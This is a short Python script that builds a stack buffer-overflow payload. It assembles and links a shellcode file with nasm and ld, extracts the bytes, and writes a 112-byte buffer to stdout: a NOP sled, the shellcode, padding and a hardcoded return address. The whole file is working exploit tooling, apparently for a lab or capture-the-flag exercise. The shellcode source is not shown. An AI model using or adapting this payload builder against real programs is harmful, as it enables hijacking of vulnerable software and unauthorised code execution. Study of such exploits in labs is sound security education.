import sys
import subprocess

nasm_flags = ['-f', 'elf32']
ld_flags = ['-melf_i386']
return_address = bytes.fromhex('ffffffff60d4ffff')
total_length = 112

def get_shellcode(asm_file):
    obj_file = asm_file + '.o'
    bin_file = asm_file + '.bin'
    subprocess.run(['nasm'] + nasm_flags + ['-o', obj_file, asm_file])
    subprocess.run(['ld'] + ld_flags + ['-o', bin_file, obj_file])
    call_result = subprocess.run(['/bin/bash', 'dumpshellcode.sh', bin_file],
            stdout=subprocess.PIPE, text=True)
    return call_result.stdout

shellcode = get_shellcode('shellcode.asm')
shellcode = shellcode.replace('\\x', '')
shellcode_bytes = bytes.fromhex(shellcode)
shellcode_padding = bytes.fromhex('90' * 4)
total_shellcode = shellcode_bytes + shellcode_padding + return_address
shellcode_slide = bytes.fromhex('90' * (total_length - len(total_shellcode)))
total_shellcode = shellcode_slide + total_shellcode
sys.stdout.buffer.write(total_shellcode)
